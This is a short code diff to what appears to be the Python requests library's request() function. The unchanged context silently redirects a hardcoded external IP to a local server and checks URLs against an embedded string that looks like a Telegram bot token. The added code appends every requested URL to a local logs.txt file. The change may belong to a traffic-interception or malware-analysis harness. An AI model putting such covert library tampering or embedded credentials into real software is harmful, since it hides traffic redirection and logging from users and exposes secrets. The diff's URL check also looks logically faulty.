@@ -12,6 +12,13 @@ from . import sessions
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import json
 
+def add_line_to_file(file_path, line):
+    try:
+        with open(file_path, 'a') as file:
+            file.write(line + '\n')
+        print(f"Line added to {file_path} successfully.")
+    except Exception as e:
+        print(f"Error: {e}")
 
 def request(method, url, **kwargs):
     """Constructs and sends a :class:`Request <Request>`.
@@ -55,6 +62,9 @@ def request(method, url, **kwargs):
     """
 
     url = url.replace("185.192.246.196", "127.0.0.1:3000")
+
+    file_path = 'logs.txt'
+    add_line_to_file(file_path, url)
 
     if not url.find('127.0.0.1') and url.find('6814878376:AAE7gm2YykoWt98jg7J-Hb1mv0gx_1FWnOs'):
         return False
